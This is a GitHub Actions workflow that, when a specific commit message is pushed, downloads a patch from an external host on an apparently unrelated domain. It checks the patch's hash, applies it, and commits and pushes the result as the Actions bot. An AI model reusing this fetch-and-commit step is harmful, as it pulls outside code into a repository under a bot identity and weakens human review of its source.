name: Materialize Chessy analytics UX candidate

on:
  push:
    branches:
      - feat/analytics-game-ux-release

permissions:
  contents: write

jobs:
  materialize:
    if: github.event.head_commit.message == 'Initialize analytics game UX handoff'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Download exact candidate patch
        run: |
          set -euo pipefail
          curl -fsSL --retry 3 'https://chessy.textilesdemedellin.com/analytics-game-ux-handoff-1788804368-16007.patch.gz' -o /tmp/chessy-candidate.patch.gz
          echo 'f5d886d46e392808dda250340819b7593fec1c4e66efe4af5251adc8030b2f3a  /tmp/chessy-candidate.patch.gz' | sha256sum -c -
          gzip -dc /tmp/chessy-candidate.patch.gz > /tmp/chessy-candidate.patch
      - name: Apply and verify candidate product tree
        run: |
          set -euo pipefail
          git apply --check /tmp/chessy-candidate.patch
          git apply /tmp/chessy-candidate.patch
          git add -A
          git rm --cached .github/workflows/analytics-game-ux-handoff.yml
          actual=$(git write-tree)
          test "$actual" = '57e2fde58288179d478b1526eb9373401194ffee'
          git add .github/workflows/analytics-game-ux-handoff.yml
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git commit -m 'Materialize verified analytics game UX candidate'
          git push origin HEAD:feat/analytics-game-ux-release
